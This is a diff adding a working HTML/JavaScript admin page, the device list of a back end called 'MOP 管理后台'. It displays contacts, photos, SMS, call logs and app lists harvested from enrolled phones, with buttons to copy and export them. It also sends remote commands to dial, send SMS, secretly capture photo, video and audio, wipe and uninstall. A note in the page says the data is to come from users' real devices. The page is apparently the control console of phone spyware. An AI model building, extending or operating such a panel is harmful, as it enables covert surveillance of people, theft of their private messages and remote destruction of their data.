@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>设备列表 - MOP 管理后台</title>
+  <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body class="admin-layout">
+  <aside class="admin-sidebar">
+    <div class="logo" id="logo">MOP 管理后台</div>
+    <nav>
+      <a href="main.html" id="navHome">首页</a>
+      <a href="devices.html" class="active" id="navDevices">设备列表</a>
+      <a href="users.html" id="navUsers">用户列表</a>
+      <a href="relations.html" id="navRelations">关系列表</a>
+      <a href="apk.html" id="navApk">应用下载</a>
+      <a href="change-password.html" id="navChangePassword">修改密码</a>
+      <a href="add-user.html" id="navAddUser">添加用户</a>
+      <a href="#" id="navLogout" style="margin-top:12px; border-top:1px solid rgba(255,255,255,.1); padding-top:12px;">退出登录</a>
+    </nav>
+  </aside>
+  <main class="admin-main">
+    <header class="admin-header">
+      <h1 id="pageTitle">设备列表</h1>
+      <div class="admin-header-actions">
+        <span class="lang-options"><button type="button" id="langZh" class="active">中文</button><button type="button" id="langEn">English</button></span>
+      </div>
+    </header>
+    <div class="admin-content">
+      <div class="card">
+        <div class="card-title"><span id="devicesCardTitle">设备列表</span> <span style="font-size:12px; color:var(--text-secondary);" id="mockHint">（预览 Mock）</span></div>
+        <div class="audit-query-bar" id="auditQueryBar">
+          <span class="audit-query-label" id="auditQueryLabel">审计数据查询</span>
+          <span class="audit-query-group">
+            <input type="text" id="auditQueryInput" placeholder="手机号/用户名/昵称" class="audit-query-input">
+            <button type="button" class="btn btn-primary btn-sm" id="auditQueryBtn">查询</button>
+          </span>
+          <span class="audit-query-group full-display-wrap">
+            <label class="full-display-label"><input type="checkbox" id="fullDisplaySwitch" autocomplete="off"> <span id="fullDisplayLabel">全显</span></label>
+          </span>
+        </div>
+        <div class="table-wrap device-table-wrap">
+          <table class="device-table">
+            <colgroup>
+              <col class="col-device-user">
+              <col class="col-device-network">
+              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
+              <col class="col-dial">
+              <col class="col-sms">
+              <col class="col-custom">
+              <col class="col-remote">
+            </colgroup>
+            <thead>
+              <tr>
+                <th id="colDeviceUser">设备/用户</th>
+                <th id="colDeviceNetwork">设备/网络</th>
+                <th id="colContacts">通讯录总数</th>
+                <th id="colPhotos">相册总数</th>
+                <th id="colSms">短信总数</th>
+                <th id="colCallRecords">通话记录总数</th>
+                <th id="colAppList">APP列表总数</th>
+                <th id="colDial">拨号设置</th>
+                <th id="colSmsSend">发送短信到</th>
+                <th id="colCustom">自定义</th>
+                <th id="colRemote">远程设备管理</th>
+              </tr>
+            </thead>
+            <tbody id="deviceTableBody">
+              <tr><td colspan="11" class="loading-cell" id="deviceTableLoading"></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </main>
+  <div class="audit-modal-overlay" id="auditModalOverlay" style="display:none;">
+    <div class="audit-modal" id="auditModal">
+      <div class="audit-modal-header">
+        <h3 class="audit-modal-title" id="auditModalTitle">通讯录</h3>
+        <button type="button" class="audit-modal-close" id="auditModalClose">&times;</button>
+      </div>
+      <div class="audit-modal-body" id="auditModalBody"></div>
+      <p class="audit-modal-note" id="auditModalNote">实际运营时：通讯录、相册、短信、通话记录、已安装APP 等数据应采集自用户设备真实数据；相册/媒体为设备真实图片照片。</p>
+    </div>
+  </div>
+  <script src="assets/js/i18n.js"></script>
+  <script src="assets/js/app.js"></script>
+  <script src="assets/js/admin-api.js"></script>
+  <script>
+    var i18n = window.ADMIN_I18N;
+    var app = window.ADMIN_APP;
+    var adminApi = window.ADMIN_API;
+    if (!app.isLoggedIn()) app.redirectLogin();
+    else {
+      function deviceModelFromInfo(deviceInfo) {
+        if (!deviceInfo) return '—';
+        try {
+          var o = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
+          return (o && o.model) ? o.model : '—';
+        } catch (e) { return '—'; }
+      }
+      function maskIp(ip) {
+        if (!ip || typeof ip !== 'string') return '—';
+        var parts = ip.trim().split('.');
+        if (parts.length === 4) return parts[0] + '.' + parts[1] + '.*.*';
+        return ip;
+      }
+      function buildDeviceRow(d) {
+        var deviceId = (d.device_id || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var nickname = (d.nickname || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var uidMasked = (d.uid || '').length > 4 ? (d.uid).slice(0, 2) + '***' + (d.uid).slice(-2) : (d.uid || '—');
+        var model = deviceModelFromInfo(d.device_info).replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var ipDisplay = maskIp(d.last_ip || '');
+        var timeDisplay = (d.created_at || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        return '<tr>' +
+          '<td class="device-info-cell"><div class="device-info-block">' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value">' + deviceId + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('usernameRole') + '</span>: <span class="info-value"><span data-masked="' + uidMasked + '" data-full="' + (d.uid || '').replace(/"/g, '&quot;') + '">' + uidMasked + '</span> / <span>' + i18n.t('userLabel') + '</span></span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value">—</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('nickname') + '</span>: <span class="info-value info-value-nickname">' + nickname + '</span></span>' +
+          '</div></td>' +
+          '<td class="device-info-cell"><div class="device-info-block">' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('phoneModel') + '</span>: <span class="info-value">' + model + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('ipLabel') + '</span>: <span class="info-value" data-masked="' + ipDisplay + '" data-full="' + (d.last_ip || '').replace(/"/g, '&quot;') + '">' + ipDisplay + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('region') + '</span>: <span class="info-value">—</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('timeLabel') + '</span>: <span class="info-value">' + timeDisplay + '</span></span>' +
+          '</div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('contactsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitContacts') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="contacts">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="contacts">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="contacts">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('photosLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitPhotos') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="gallery">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="gallery">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('smsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitSms') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="sms">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="sms">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="sms">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('callRecordsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitCalls') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="calllog">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="calllog">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="calllog">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('appListLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitApps') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="applist">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="applist">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="applist">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="control-cell control-cell-vertical" headers="colDial"><div class="control-col-dial"><div class="control-row"><input type="text" class="dial-number-input" placeholder="' + (i18n.t('dialNumber') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-dial-cmd">' + i18n.t('dialButton') + '</button></div><div class="control-row"><button type="button" class="btn btn-sm">' + i18n.t('hangUpButton') + '</button></div></div></td>' +
+          '<td class="control-cell control-cell-vertical" headers="colSmsSend"><div class="control-col-sms"><div class="control-row"><input type="text" class="sms-number-input" placeholder="' + (i18n.t('smsNumber') || '') + '"></div><div class="control-row"><input type="text" class="sms-body-input" placeholder="' + (i18n.t('smsContent') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-sms-cmd">' + i18n.t('sendButton') + '</button></div></div></td>' +
+          '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm">' + i18n.t('func1') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func2') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func3') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func4') + '</button></div></td>' +
+          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-wipe-cmd btn-danger">' + i18n.t('remoteErase') + '</button><button type="button" class="btn btn-sm btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
+          '</tr>';
+      }
+      function renderDevicesTable(items) {
+        var tbody = document.getElementById('deviceTableBody');
+        if (!tbody) return;
+        if (!items || items.length === 0) {
+          tbody.innerHTML = '<tr><td colspan="11" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>';
+          return;
+        }
+        tbody.innerHTML = items.map(buildDeviceRow).join('');
+      }
+      function loadDevices(params) {
+        if (!adminApi || !adminApi.getAdminToken()) {
+          renderDevicesTable([]);
+          return;
+        }
+        var hint = document.getElementById('deviceTableLoading');
+        if (hint) hint.textContent = i18n.t('loadingDevices') || '加载中…';
+        adminApi.getDevices(params || {}).then(function(data) {
+          var hintEl = document.getElementById('mockHint');
+          var items = (data && data.items) ? data.items : [];
+          renderDevicesTable(items);
+          if (hintEl) hintEl.textContent = '（已从 API 加载 ' + (data.total != null ? data.total : items.length) + ' 条）';
+          if (items.length > 0) bindDeviceRowHandlers();
+        }).catch(function(r) {
+          if (r && (r.status === 401 || r.status === 403)) app.redirectLogin();
+          else {
+            renderDevicesTable([]);
+            var hintEl = document.getElementById('mockHint');
+            if (hintEl) hintEl.textContent = i18n.t('previewMock');
+          }
+        });
+      }
+      loadDevices();
+      document.getElementById('logo').textContent = i18n.t('appName');
+      document.getElementById('navHome').textContent = i18n.t('navHome');
+      document.getElementById('navDevices').textContent = i18n.t('navDevices');
+      document.getElementById('navUsers').textContent = i18n.t('navUsers');
+      document.getElementById('navRelations').textContent = i18n.t('navRelations');
+      document.getElementById('navApk').textContent = i18n.t('navApk');
+      document.getElementById('navChangePassword').textContent = i18n.t('navChangePassword');
+      document.getElementById('navAddUser').textContent = i18n.t('navAddUser');
+      document.getElementById('navLogout').textContent = i18n.t('logout');
+      document.getElementById('pageTitle').textContent = i18n.t('navDevices');
+      document.getElementById('devicesCardTitle').textContent = i18n.t('navDevices');
+      document.getElementById('colDeviceUser').textContent = i18n.t('deviceUserInfo');
+      document.getElementById('colDeviceNetwork').textContent = i18n.t('deviceNetworkInfo');
+      document.querySelectorAll('.device-info-block [data-i18n], .audit-cell .audit-label[data-i18n], .audit-count [data-i18n], .audit-actions [data-i18n], .control-cell-vertical [data-i18n], .control-col-remote [data-i18n], .custom-func-block [data-i18n]').forEach(function(el){ el.textContent = i18n.t(el.getAttribute('data-i18n')); });
+      document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){ el.placeholder = i18n.t(el.getAttribute('data-i18n-placeholder')); });
+      document.getElementById('colContacts').textContent = i18n.t('contactsTotal');
+      document.getElementById('colPhotos').textContent = i18n.t('photosTotal');
+      document.getElementById('colSms').textContent = i18n.t('smsTotal');
+      document.getElementById('colCallRecords').textContent = i18n.t('callRecordsTotal');
+      document.getElementById('colAppList').textContent = i18n.t('appListTotal');
+      document.getElementById('auditQueryLabel').textContent = i18n.t('auditQueryLabel');
+      document.getElementById('auditQueryInput').placeholder = i18n.t('queryPlaceholder');
+      document.getElementById('auditQueryBtn').textContent = i18n.t('queryButton');
+      document.getElementById('colDial').textContent = i18n.t('dialSettings');
+      document.getElementById('colSmsSend').textContent = i18n.t('sendSmsTo');
+      document.getElementById('colCustom').textContent = i18n.t('customBtn');
+      document.getElementById('colRemote').textContent = i18n.t('remoteManage');
+      document.getElementById('mockHint').textContent = i18n.t('previewMock');
+      var loadingEl = document.getElementById('deviceTableLoading');
+      if (loadingEl) loadingEl.textContent = i18n.t('loadingDevices');
+      document.getElementById('fullDisplayLabel').textContent = i18n.t('fullDisplay');
+      document.getElementById('navLogout').onclick = function(e){ e.preventDefault(); app.setLoggedIn(false); app.redirectLogin(); };
+      document.getElementById('auditQueryBtn').onclick = function() {
+        var kw = (document.getElementById('auditQueryInput').value || '').trim();
+        loadDevices(kw ? { keyword: kw } : {});
+      };
+      app.applyRoleNav();
+      document.getElementById('langZh').onclick = function(){ i18n.setLang('zh'); location.reload(); };
+      document.getElementById('langEn').onclick = function(){ i18n.setLang('en'); location.reload(); };
+      document.getElementById('langZh').classList.toggle('active', i18n.getLang()==='zh');
+      document.getElementById('langEn').classList.toggle('active', i18n.getLang()==='en');
+      (function(){
+        var fullSwitch = document.getElementById('fullDisplaySwitch');
+        function applyFullDisplay(on){
+          document.querySelectorAll('[data-masked][data-full]').forEach(function(el){
+            el.textContent = on ? el.getAttribute('data-full') : el.getAttribute('data-masked');
+          });
+          document.querySelectorAll('.audit-count [data-i18n]').forEach(function(el){
+            if (on) { el.style.display = 'none'; } else { el.style.display = ''; el.textContent = i18n.t(el.getAttribute('data-i18n')); }
+          });
+        }
+        fullSwitch.checked = false;
+        applyFullDisplay(false);
+        fullSwitch.onchange = function(){ applyFullDisplay(this.checked); };
+      })();
+      var MOCK_AUDIT = {
+        dev_a1b2c3: {
+          contacts: [{ name: '王五', phone: '13812345678', time: '2025-02-22 09:00' }, { name: '赵六', phone: '13987654321', time: '2025-02-22 09:00' }, { name: '钱七', phone: '13612349012', time: '2025-02-22 08:55' }],
+          sms: [{ type: '收', number: '10086', body: '【中国移动】您的余额不足…', time: '2025-02-22 08:55' }, { type: '发', number: '13812345678', body: '好的，明天见。', time: '2025-02-22 08:50' }],
+          calllog: [{ type: '来电', number: '13812345678', duration: '02:35', time: '2025-02-22 09:00' }, { type: '去电', number: '10086', duration: '00:45', time: '2025-02-22 08:30' }],
+          applist: [{ name: '微信', pkg: 'com.tencent.mm', time: '2025-02-22 09:00' }, { name: '支付宝', pkg: 'com.eg.android.AlipayGphone', time: '2025-02-22 09:00' }],
+          gallery: ['assets/images/gallery/photo1.jpg', 'assets/images/gallery/photo2.jpg', 'assets/images/gallery/photo3.jpg', 'assets/images/gallery/photo4.jpg', 'assets/images/gallery/photo5.jpg']
+        },
+        dev_d4e5f6: {
+          contacts: [{ name: '孙七', phone: '13612349012', time: '2025-02-21 14:20' }, { name: '吴十', phone: '18812341122', time: '2025-02-21 14:18' }],
+          sms: [{ type: '收', number: '95588', body: '【工商银行】验证码…', time: '2025-02-21 14:10' }, { type: '发', number: '13987654321', body: '会议改到下午3点', time: '2025-02-21 14:05' }],
+          calllog: [{ type: '未接', number: '13987654321', duration: '—', time: '2025-02-21 14:00' }, { type: '去电', number: '95588', duration: '03:12', time: '2025-02-21 13:45' }],
+          applist: [{ name: '抖音', pkg: 'com.ss.android.ugc.aweme', time: '2025-02-21 14:20' }, { name: '钉钉', pkg: 'com.alibaba.android.rimet', time: '2025-02-21 14:20' }],
+          gallery: ['assets/images/gallery/photo1.jpg', 'assets/images/gallery/photo2.jpg', 'assets/images/gallery/photo3.jpg']
+        }
+      };
+      function getDeviceIdFromButton(btn){
+        var tr = btn.closest('tr');
+        if (!tr) return '';
+        var deviceIdEl = tr.querySelector('.device-id-value') || tr.querySelector('.device-info-cell .device-info-block .info-value');
+        return deviceIdEl ? deviceIdEl.textContent.trim() : '';
+      }
+      function sendCommandToDevice(deviceId, cmd, params, btn) {
+        if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+        if (!adminApi || !adminApi.sendCommand) { alert('API 未就绪'); return; }
+        var label = btn ? btn.textContent : '';
+        if (btn) { btn.disabled = true; btn.textContent = (i18n.t('sending') || '发送中') + '...'; }
+        adminApi.sendCommand(deviceId, cmd, params || {}).then(function(res) {
+          if (btn) { btn.disabled = false; btn.textContent = label; }
+          if (res && res.ok) { alert(i18n.t('commandSent') || '指令已下发'); return; }
+          var msg = (i18n.t('sendFailed') || '下发失败');
+          if (res && res.json) { res.json().then(function(b){ if (b && b.message) alert(b.message); else alert(msg); }).catch(function(){ alert(msg); }); }
+          else { alert(msg); }
+        }).catch(function(err) {
+          if (btn) { btn.disabled = false; btn.textContent = label; }
+          alert(err && err.message ? err.message : (i18n.t('sendFailed') || '下发失败'));
+        });
+      }
+      function getAuditDataAsText(deviceId, page){
+        var data = MOCK_AUDIT[deviceId] || MOCK_AUDIT.dev_a1b2c3;
+        if (page === 'contacts') {
+          var lines = ['姓名\t号码\t上报时间'];
+          (data.contacts || []).forEach(function(r){ lines.push(r.name + '\t' + r.phone + '\t' + r.time); });
+          return lines.join('\n');
+        }
+        if (page === 'sms') {
+          var lines = ['类型\t号码\t内容\t上报时间'];
+          (data.sms || []).forEach(function(r){ lines.push(r.type + '\t' + r.number + '\t' + r.body + '\t' + r.time); });
+          return lines.join('\n');
+        }
+        if (page === 'calllog') {
+          var lines = ['类型\t号码\t时长\t上报时间'];
+          (data.calllog || []).forEach(function(r){ lines.push(r.type + '\t' + r.number + '\t' + r.duration + '\t' + r.time); });
+          return lines.join('\n');
+        }
+        if (page === 'applist') {
+          var lines = ['应用名\t包名\t上报时间'];
+          (data.applist || []).forEach(function(r){ lines.push(r.name + '\t' + r.pkg + '\t' + r.time); });
+          return lines.join('\n');
+        }
+        if (page === 'gallery') {
+          return (data.gallery || []).join('\n');
+        }
+        return '';
+      }
+      function copyTextToClipboard(text){
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(function(){ alert(i18n.t('copiedToClipboard')); }).catch(function(){ fallbackCopy(text); });
+        } else { fallbackCopy(text); }
+      }
+      function fallbackCopy(text){
+        var ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0'; document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); alert('已复制到剪贴板'); } catch (e) { alert('复制失败'); }
+        document.body.removeChild(ta);
+      }
+      function downloadAsPlainText(text, filename){
+        var blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a'); a.href = url; a.download = filename; a.click();
+        URL.revokeObjectURL(url);
+      }
+      var placeholders = ['https://picsum.photos/200/200?random=1','https://picsum.photos/200/200?random=2','https://picsum.photos/200/200?random=3','https://picsum.photos/200/200?random=4','https://picsum.photos/200/200?random=5'];
+      var pageToApiType = { contacts: 'contacts', sms: 'sms', calllog: 'call_log', applist: 'app_list', gallery: 'gallery' };
+      function renderMockAudit(page, deviceId, bodyEl) {
+        var data = MOCK_AUDIT[deviceId] || MOCK_AUDIT.dev_a1b2c3;
+        if (page === 'contacts') {
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>姓名</th><th>号码</th><th>上报时间</th></tr></thead><tbody>' + data.contacts.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.phone+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+        } else if (page === 'sms') {
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>内容</th><th>上报时间</th></tr></thead><tbody>' + data.sms.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.body+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+        } else if (page === 'calllog') {
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>时长</th><th>上报时间</th></tr></thead><tbody>' + data.calllog.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.duration+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+        } else if (page === 'applist') {
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>应用名</th><th>包名</th><th>上报时间</th></tr></thead><tbody>' + data.applist.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.pkg+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+        } else if (page === 'gallery') {
+          bodyEl.innerHTML = '<div class="gallery-grid">' + (data.gallery || []).map(function(src, i){ return '<img src="'+src+'" alt="相册'+(i+1)+'" onerror="this.src=\''+ (placeholders[i]||placeholders[0]) +'\'" />'; }).join('') + '</div>';
+        } else { bodyEl.innerHTML = '<p>暂无数据</p>'; }
+      }
+      function renderApiItems(page, items, bodyEl) {
+        if (!items || items.length === 0) { bodyEl.innerHTML = '<p>暂无数据</p>'; return; }
+        if (page === 'gallery' && items[0].url != null) {
+          bodyEl.innerHTML = '<div class="gallery-grid">' + items.map(function(it, i){ return '<img src="'+(it.url||'')+'" alt="'+(i+1)+'" onerror="this.style.display=\'none\'" />'; }).join('') + '</div>';
+          return;
+        }
+        var keys = Object.keys(items[0]);
+        var hasId = items.some(function(r){ return r.id != null; });
+        if (hasId) keys = keys.concat(['_op']);
+        var thead = '<tr>' + keys.map(function(k){ return '<th>' + (k === '_op' ? (i18n.t('actions') || '操作') : k) + '</th>'; }).join('') + '</tr>';
+        var tbody = items.map(function(row){
+          var cells = keys.filter(function(k){ return k !== '_op'; }).map(function(k){ return '<td>' + (row[k] != null ? row[k] : '') + '</td>'; });
+          if (hasId) cells.push('<td>' + (row.id != null ? '<button type="button" class="btn btn-sm btn-download-blob" data-id="'+row.id+'" data-type="'+(row.type||'')+'">' + (i18n.t('download') || '下载') + '</button>' : '') + '</td>');
+          return '<tr>'+cells.join('')+'</tr>';
+        }).join('');
+        bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div>';
+        bodyEl.querySelectorAll('.btn-download-blob').forEach(function(btn){
+          btn.onclick = function(){
+            var id = this.getAttribute('data-id');
+            var typ = this.getAttribute('data-type') || '';
+            if (!id || !adminApi || !adminApi.downloadAuditBlob) return;
+            var name = 'audit_' + id + (typ ? '_' + typ : '') + '.bin';
+            adminApi.downloadAuditBlob(id, name).catch(function(){ alert(i18n.t('downloadFailed') || '下载失败'); });
+          };
+        });
+      }
+      function openAuditModal(page, deviceId){
+        var overlay = document.getElementById('auditModalOverlay');
+        var titleEl = document.getElementById('auditModalTitle');
+        var bodyEl = document.getElementById('auditModalBody');
+        var titles = { contacts: '通讯录', gallery: '相册', sms: '短信', calllog: '通话记录', applist: '已安装APP' };
+        titleEl.textContent = (titles[page] || page) + ' - ' + deviceId;
+        var apiType = pageToApiType[page];
+        if (apiType && adminApi && adminApi.getAdminToken() && adminApi.getAudit) {
+          adminApi.getAudit(deviceId, apiType).then(function(data) {
+            if (data.items && data.items.length > 0) {
+              renderApiItems(page, data.items, bodyEl);
+            } else {
+              renderMockAudit(page, deviceId, bodyEl);
+            }
+            overlay.style.display = 'flex';
+          }).catch(function() {
+            renderMockAudit(page, deviceId, bodyEl);
+            overlay.style.display = 'flex';
+          });
+        } else {
+          renderMockAudit(page, deviceId, bodyEl);
+          overlay.style.display = 'flex';
+        }
+      }
+      function bindDeviceRowHandlers() {
+        document.querySelectorAll('.btn-audit-view').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            var page = this.getAttribute('data-page');
+            openAuditModal(page, deviceId);
+          };
+        });
+        document.querySelectorAll('.btn-audit-copy').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            var page = this.getAttribute('data-page');
+            var text = getAuditDataAsText(deviceId, page);
+            if (text) copyTextToClipboard(text); else alert(i18n.t('noContentToCopy'));
+          };
+        });
+        document.querySelectorAll('.btn-audit-export').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            var page = this.getAttribute('data-page');
+            var text = getAuditDataAsText(deviceId, page);
+            var names = { contacts: '通讯录', sms: '短信', calllog: '通话记录', applist: '已安装APP', gallery: '相册' };
+            var name = names[page] || page;
+            var filename = name + '_' + deviceId + '.txt';
+            if (text) downloadAsPlainText(text, filename); else alert(i18n.t('noContentToExport'));
+          };
+        });
+        document.querySelectorAll('.btn-dial-cmd').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            var cell = this.closest('.control-col-dial');
+            var numberInput = cell ? cell.querySelector('.dial-number-input') : null;
+            var number = numberInput ? numberInput.value.trim() : '';
+            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this);
+          };
+        });
+        document.querySelectorAll('.btn-sms-cmd').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            var cell = this.closest('.control-col-sms');
+            var numberInput = cell ? cell.querySelector('.sms-number-input') : null;
+            var bodyInput = cell ? cell.querySelector('.sms-body-input') : null;
+            var number = numberInput ? numberInput.value.trim() : '';
+            var body = bodyInput ? bodyInput.value.trim() : '';
+            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this);
+          };
+        });
+        document.querySelectorAll('.btn-wipe-cmd').forEach(function(btn){
+          btn.onclick = function(){
+            var deviceId = getDeviceIdFromButton(this);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmWipe') || '确定对该设备执行远程擦除？将清空本地数据并退回激活页。')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.wipe', {}, this);
+          };
+        });
+        document.querySelectorAll('.btn-capture-photo').forEach(function(btn){
+          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this); };
+        });
+        document.querySelectorAll('.btn-capture-video').forEach(function(btn){
+          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this); };
+        });
+        document.querySelectorAll('.btn-capture-audio').forEach(function(btn){
+          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this); };
+        });
+      }
+      document.getElementById('auditModalClose').onclick = function(){ document.getElementById('auditModalOverlay').style.display = 'none'; };
+      document.getElementById('auditModalOverlay').onclick = function(e){ if (e.target === this) this.style.display = 'none'; };
+    }
+  </script>
+</body>
+</html>
